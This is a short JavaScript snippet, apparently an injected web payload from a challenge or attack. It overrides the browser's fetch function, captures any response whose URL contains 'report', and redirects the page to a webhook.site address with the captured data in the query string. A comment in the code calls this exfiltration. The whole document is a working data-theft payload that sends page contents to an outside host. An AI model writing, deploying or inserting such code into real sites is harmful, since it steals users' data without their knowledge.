// Wait for the page to call analyzeUrl, then intercept the fetch response
(function() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        
        if (args[0] && args[0].includes('report')) {
            const clonedResponse = response.clone();
            const data = await clonedResponse.text();
            
            // Exfiltrate the report data
            setTimeout(() => {
                window.location = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?report=' + encodeURIComponent(data);
            }, 100);
        }
        
        return response;
    };
})();